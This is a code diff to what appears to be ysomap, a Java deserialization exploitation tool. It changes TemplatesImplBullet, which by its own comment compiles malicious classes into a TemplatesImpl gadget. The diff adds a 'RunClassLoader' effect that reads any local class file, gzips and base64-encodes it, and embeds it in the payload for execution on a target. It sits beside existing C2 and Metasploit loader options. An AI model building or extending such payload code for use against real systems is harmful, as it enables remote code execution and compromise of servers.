@@ -18,15 +18,21 @@ import c2.*;
 import ysomap.bullets.AbstractBullet;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
+import ysomap.common.util.Strings;
 import ysomap.core.util.ClassFiles;
 import ysomap.core.util.FileHelper;
 import ysomap.core.util.PayloadHelper;
 import ysomap.core.util.ReflectionHelper;
 
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.Serializable;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.util.Arrays;
 import java.util.UUID;
+import java.util.zip.GZIPOutputStream;
 
 /**
  * 编译恶意类，并填充到TemplatesImpl
@@ -66,7 +72,7 @@ public class TemplatesImplBullet extends AbstractBullet<Object> {
     @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
             "可选default、" +
             "TomcatEcho、SocketEcho、RemoteFileLoader、WinC2Loader、MSFJavaC2Loader、" +
-            "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader")
+            "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader、RunClassLoader")
     private String effect = "default";
 
     @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
@@ -157,6 +163,18 @@ public class TemplatesImplBullet extends AbstractBullet<Object> {
             pool.appendClassPath(new ClassClassPath(MSFJavaC2Loader.class));
             cc = pool.getCtClass(MSFJavaC2Loader.class.getName());
             cc.setName("MSFJavaC2Loader"+System.currentTimeMillis());
+        }else if ("RunClassLoader".equals(effect)){
+            Path path = Paths.get(body);
+            ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
+            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
+            gzipOutputStream.write(Files.readAllBytes(path));
+            gzipOutputStream.close();
+            code = String.format("classBae64Str = \"%s\";", Strings.base64ToString(outBuf.toByteArray()));
+
+            Class targetClass = RunClassLoader.class;
+            pool.appendClassPath(new ClassClassPath(targetClass));
+            cc = pool.getCtClass(targetClass.getName());
+            cc.setName(targetClass.getName()+System.currentTimeMillis());
         }
 
         if(cc != null){
